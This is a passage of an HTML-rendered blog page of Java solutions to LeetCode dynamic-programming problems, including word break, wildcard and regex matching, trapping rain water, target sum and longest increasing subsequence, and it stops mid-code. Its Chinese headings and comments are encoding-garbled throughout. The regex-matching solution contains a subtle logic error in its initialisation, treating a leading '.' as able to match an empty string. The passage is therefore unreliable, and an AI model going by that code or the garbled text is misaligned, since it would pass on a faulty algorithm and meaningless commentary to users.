<h3 id="139-å•è¯æ‹†åˆ†-x2F"><a href="#139-å•è¯æ‹†åˆ†-x2F" class="headerlink" title="139. å•è¯æ‹†åˆ†&#x2F;"></a><a href="https://leetcode-cn.com/problems/word-break/">139. å•è¯æ‹†åˆ†</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŠ¨æ€è§„åˆ’</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> &#123;</span><br><span class="line">        <span class="comment">// dp</span></span><br><span class="line">        <span class="type">boolean</span>[] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[s.length() + <span class="number">1</span>];</span><br><span class="line">        <span class="comment">// åˆå§‹åŒ–0å€¼</span></span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// ç”¨ä¸€ä¸ªsetæ¥å­˜å•è¯åˆ—è¡¨</span></span><br><span class="line">        Set&lt;String&gt; wordSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(wordDict);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ç„¶åéå†</span></span><br><span class="line">        <span class="comment">// dp[i]è¡¨ç¤ºå­—ç¬¦ä¸²sçš„å‰iä¸ªå­—ç¬¦èƒ½å¦æ‹†åˆ†æˆwordDict</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; s.length() + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dp[j] &amp;&amp; wordSet.contains(s.substring(j , i))) &#123;</span><br><span class="line">                    dp[i] = <span class="literal">true</span>;</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[s.length()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="140-å•è¯æ‹†åˆ†-II-x2F-x2F"><a href="#140-å•è¯æ‹†åˆ†-II-x2F-x2F" class="headerlink" title="140. å•è¯æ‹†åˆ† II&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/word-break-ii/">140. å•è¯æ‹†åˆ† II</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŠ¨æ€è§„åˆ’ + å›æº¯</span></span><br><span class="line"><span class="comment">// å…ˆç”¨åŠ¨æ€è§„åˆ’åˆ¤æ–­æ˜¯å¦æœ‰è§£,ç„¶åå†ç”¨å›æº¯è¾“å‡ºæ‰€æœ‰è§£</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        HashSet&lt;String&gt; wordSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>(wordDict);</span><br><span class="line">        <span class="type">boolean</span>[] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[len + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; len + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dp[j] &amp;&amp; wordSet.contains(s.substring(j,i))) &#123;</span><br><span class="line">                    dp[i] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">if</span> (dp[len]) &#123;</span><br><span class="line">            Deque&lt;String&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>();</span><br><span class="line">            dfs(res, <span class="number">0</span>,len, s, wordSet, path, dp);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(List&lt;String&gt; res, <span class="type">int</span> start, <span class="type">int</span> len, String s, HashSet&lt;String&gt; wordSet, Deque&lt;String&gt; path, <span class="type">boolean</span>[] dp)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start == len) &#123;</span><br><span class="line">            res.add(String.join(<span class="string">&quot; &quot;</span>, path));</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> s.substring(start,i + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (wordSet.contains(prefix)) &#123;</span><br><span class="line">                path.addLast(prefix);</span><br><span class="line">                dfs(res, i + <span class="number">1</span> ,len, s, wordSet, path, dp);</span><br><span class="line">                path.removeLast();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="44-é€šé…ç¬¦åŒ¹é…-x2F-x2F"><a href="#44-é€šé…ç¬¦åŒ¹é…-x2F-x2F" class="headerlink" title="44. é€šé…ç¬¦åŒ¹é…&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/wildcard-matching/">44. é€šé…ç¬¦åŒ¹é…</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŠ¨æ€è§„åˆ’</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMatch</span><span class="params">(String s, String p)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> p.length();</span><br><span class="line">        <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] pc = p.toCharArray();</span><br><span class="line"></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pc.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pc[i] != <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i + <span class="number">1</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n + <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pc[i - <span class="number">1</span>] == sc[j - <span class="number">1</span>] || pc[i - <span class="number">1</span>] == <span class="string">&#x27;?&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pc[i - <span class="number">1</span>] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j] | dp[i - <span class="number">1</span>][j - <span class="number">1</span>] || dp[i][j - <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-19-æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…"><a href="#å‰‘æŒ‡-Offer-19-æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…" class="headerlink" title="å‰‘æŒ‡ Offer 19. æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…"></a><a href="https://leetcode-cn.com/problems/zheng-ze-biao-da-shi-pi-pei-lcof/">å‰‘æŒ‡ Offer 19. æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMatch</span><span class="params">(String s, String p)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> p.length();</span><br><span class="line">        <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] pc = p.toCharArray();</span><br><span class="line"></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (pc.length &gt; <span class="number">1</span> &amp;&amp; pc[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">            dp[<span class="number">1</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pc.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pc[i] != <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i + <span class="number">1</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; pc.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pc[i] != <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i + <span class="number">1</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n + <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pc[i - <span class="number">1</span>] == sc[j - <span class="number">1</span>] || pc[i - <span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pc[i - <span class="number">1</span>] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] |= dp[i - <span class="number">1</span>][j];</span><br><span class="line">                    <span class="keyword">if</span> (i &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">                        dp[i][j] = dp[i - <span class="number">2</span>][j] | dp[i][j];</span><br><span class="line">                        <span class="keyword">if</span> (pc[i - <span class="number">2</span>] == sc[j - <span class="number">1</span>] || pc[i - <span class="number">2</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                            dp[i][j] |= dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                            dp[i][j] |= dp[i][j - <span class="number">1</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="42-æ¥é›¨æ°´-x2F-x2F"><a href="#42-æ¥é›¨æ°´-x2F-x2F" class="headerlink" title="42. æ¥é›¨æ°´&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/trapping-rain-water/">42. æ¥é›¨æ°´</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åŠ¨æ€è§„åˆ’,é¦–å…ˆç”¨ä¸¤ä¸ªæ•°ç»„ï¼Œmax_left [i]ä»£è¡¨ç¬¬ i åˆ—å·¦è¾¹æœ€é«˜çš„å¢™çš„é«˜åº¦ï¼Œmax_right[i] ä»£è¡¨ç¬¬ i åˆ—å³è¾¹æœ€é«˜çš„å¢™çš„é«˜åº¦ã€‚</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> height.length;</span><br><span class="line">        <span class="type">int</span>[] maxL = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span>[] maxR = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            maxL[i] = Math.max(maxL[i - <span class="number">1</span>], height[i - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            maxR[i] = Math.max(maxR[i + <span class="number">1</span>], height[i + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (height[i] &gt;= maxL[i] || height[i] &gt;= maxR[i]) <span class="keyword">continue</span>;</span><br><span class="line">            res = res + Math.min(maxL[i],maxR[i]) - height[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ä¼˜åŒ–</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[height.length];</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; height.length; i++) &#123;</span><br><span class="line">            dp[i] = Math.max(dp[i - <span class="number">1</span>], height[i - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> height.length - <span class="number">2</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">            max = Math.max(max, height[i + <span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span> (height[i] &gt;= max || height[i] &gt;= dp[i]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res += Math.min(max, dp[i]) - height[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒæŒ‡é’ˆ</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> height.length - <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max_left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max_right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; height.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (height[left - <span class="number">1</span>] &lt; height[right + <span class="number">1</span>]) &#123;</span><br><span class="line">                max_left = Math.max(max_left, height[left - <span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span> (max_left &gt; height[left]) &#123;</span><br><span class="line">                    sum = sum + max_left - height[left];</span><br><span class="line">                &#125;</span><br><span class="line">                left++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                max_right = Math.max(max_right, height[right + <span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span> (max_right &gt; height[right]) &#123;</span><br><span class="line">                    sum = sum + max_right - height[right];</span><br><span class="line">                &#125;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ ˆ</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">current</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (current &lt; height.length) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.empty() &amp;&amp; height[current] &gt; height[stack.peek()]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> height[stack.peek()];</span><br><span class="line">                stack.pop();</span><br><span class="line">                <span class="keyword">if</span> (stack.empty()) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">distance</span> <span class="operator">=</span> current - stack.peek() - <span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> Math.min(height[stack.peek()], height[current]);</span><br><span class="line">                sum = sum + distance * (min - h);</span><br><span class="line">            &#125;</span><br><span class="line">            stack.push(current);</span><br><span class="line">            current++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="494-ç›®æ ‡å’Œ-x2F"><a href="#494-ç›®æ ‡å’Œ-x2F" class="headerlink" title="494. ç›®æ ‡å’Œ&#x2F;"></a><a href="https://leetcode-cn.com/problems/target-sum/">494. ç›®æ ‡å’Œ</a>&#x2F;</h3><h4 id="æ–¹æ³•ä¸€-åŠ¨æ€è§„åˆ’"><a href="#æ–¹æ³•ä¸€-åŠ¨æ€è§„åˆ’" class="headerlink" title="æ–¹æ³•ä¸€:åŠ¨æ€è§„åˆ’"></a>æ–¹æ³•ä¸€:åŠ¨æ€è§„åˆ’</h4><p>æ‰¾åˆ°numsä¸€ä¸ªæ­£å­é›†å’Œä¸€ä¸ªè´Ÿå­é›†ï¼Œä½¿å¾—æ€»å’Œç­‰äºtarget</p>
<p>æˆ‘ä»¬å‡è®¾Pæ˜¯æ­£å­é›†ï¼ŒNæ˜¯è´Ÿå­é›† ä¾‹å¦‚ï¼š å‡è®¾nums &#x3D; [1, 2, 3, 4, 5]ï¼Œtarget &#x3D; 3ï¼Œä¸€ä¸ªå¯èƒ½çš„è§£å†³æ–¹æ¡ˆæ˜¯+1-2+3-4+5 &#x3D; 3 è¿™é‡Œæ­£å­é›†P &#x3D; [1, 3, 5]å’Œè´Ÿå­é›†N &#x3D; [2, 4]</p>
<p>è½¬åŒ–ä¸ºèƒŒåŒ…é—®é¢˜,èƒŒåŒ…èƒ½æ”¾Pä¸ª,ç„¶åæ€ä¹ˆæ”¾.</p>
<p> dp[i]ä»£è¡¨çš„å«ä¹‰æ˜¯ä»numsä¸­å–æ•°ç›¸åŠ å’Œä¸ºiæ—¶æœ‰å¤šå°‘ç§å–æ³•.</p>
<p>dp[0]&#x3D;1 å…¶å®å·²ç»æ˜¯å°†é¢˜ç›®è½¬åŒ–æˆ0&#x2F;1èƒŒåŒ…é—®é¢˜äº†ï¼Œå¥½æ¯”èƒŒåŒ…é‡Œé¢æ€ä¹ˆæ”¾é’±æ°å¥½æ”¾åˆ°8å—é’±ï¼Œå‡å¦‚æ°å¥½æ”¾åˆ°0å…ƒï¼Œåº”è¯¥å°±æ˜¯ä¸æ”¾é’±åˆ°èƒŒåŒ…è¿™ç§æƒ…å†µäº†ï¼Œæ‰€ä»¥åªæœ‰ä¸€ç§æƒ…å†µï¼Œæ‰€ä»¥dp[0]&#x3D;1ï¼Œæ²¡è½¬åŒ–æˆ01èƒŒåŒ…é—®é¢˜çš„æ—¶å€™ dp[0]&#x3D;1è‚¯å®šä¸æˆç«‹çš„ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                  sum(P) - sum(N) = target</span><br><span class="line">sum(P) + sum(N) + sum(P) - sum(N) = target + sum(P) + sum(N)</span><br><span class="line">                       2 * sum(P) = target + sum(nums)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findTargetSumWays</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> S)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            sum += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((S + sum) % <span class="number">2</span> ==  <span class="number">1</span> || sum &lt; S) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> func(nums, (S + sum) &gt;&gt;&gt; <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> s)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[s + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> n : nums) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> s; j &gt;= n; j--) &#123;</span><br><span class="line">                dp[j] += dp[j - n];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[s];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-47-ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼"><a href="#å‰‘æŒ‡-Offer-47-ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼" class="headerlink" title="å‰‘æŒ‡ Offer 47. ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼"></a><a href="https://leetcode-cn.com/problems/li-wu-de-zui-da-jie-zhi-lcof/">å‰‘æŒ‡ Offer 47. ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŠ¨æ€è§„åˆ’</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxValue</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[i + <span class="number">1</span>][j + <span class="number">1</span>] = Math.max(dp[i][j + <span class="number">1</span>], dp[i + <span class="number">1</span>][j]) + grid[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="300-æœ€é•¿ä¸Šå‡å­åºåˆ—"><a href="#300-æœ€é•¿ä¸Šå‡å­åºåˆ—" class="headerlink" title=" 300. æœ€é•¿ä¸Šå‡å­åºåˆ—"></a><a href="https://leetcode-cn.com/problems/longest-increasing-subsequence"> 300. æœ€é•¿ä¸Šå‡å­åºåˆ—</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLIS</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> len;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">        Arrays.fill(dp, <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> dp[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &lt; nums[i]) &#123;</span><br><span class="line">                    dp[i] = 